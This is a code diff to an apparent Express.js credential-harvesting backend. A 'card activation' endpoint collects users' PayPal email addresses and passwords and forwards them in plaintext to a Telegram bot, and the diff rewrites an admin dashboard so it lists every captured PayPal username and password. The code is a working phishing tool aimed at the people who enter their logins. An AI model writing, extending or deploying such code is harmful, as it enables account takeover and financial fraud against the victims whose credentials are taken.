@@ -68,10 +68,7 @@ const authenticateToken = (req, res, next) => {
 app.listen(port, async () => {
     console.log(`Server running on port ${port}`);
     const testMessage = 'Server started successfully - Test notification from https://o-448v.onrender.com';
-    const success = await sendTelegramNotification(testMessage);
-    if (!success) {
-        console.error('Failed to send test notification. Check bot token, chat ID, and network connectivity.');
-    }
+    await sendTelegramNotification(testMessage);
 });
 
 // Authentication routes
@@ -177,8 +174,8 @@ app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
         data.logs.push({ user: req.user.username, time: Date.now() });
         fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
         const message = `Card ${cardId} activated by ${req.user.username} with PayPal: Email: ${paypalUsername}, Password: ${paypalPassword}`;
-        const telegramSuccess = await sendTelegramNotification(message);
-        res.json({ message: 'Card activated', cardId, telegramNotification: telegramSuccess });
+        await sendTelegramNotification(message);
+        res.json({ message: 'Card activated', cardId });
     } catch (error) {
         console.error('Activate card error:', error);
         res.status(500).json({ error: 'Server error activating card' });
@@ -197,7 +194,17 @@ app.get('/api/cards/logs', authenticateToken, (req, res) => {
 app.get('/api/creator/dashboard', authenticateToken, (req, res) => {
     try {
         if (req.user.username !== 'admin') return res.status(403).json({ error: 'Access denied' });
-        res.json({ generatedCards: data.cards, paypalLogins: data.cards.filter(c => c.paypalUsername) });
+        const dashboardData = {
+            generatedCards: data.cards,
+            paypalLogins: data.cards.filter(c => c.paypalUsername && c.paypalPassword).map(c => ({
+                cardId: c.cardId,
+                paypalUsername: c.paypalUsername,
+                paypalPassword: c.paypalPassword,
+                user: c.user,
+                timestamp: c.time || Date.now()
+            }))
+        };
+        res.json(dashboardData);
     } catch (error) {
         console.error('Dashboard error:', error);
         res.status(500).json({ error: 'Server error loading dashboard' });
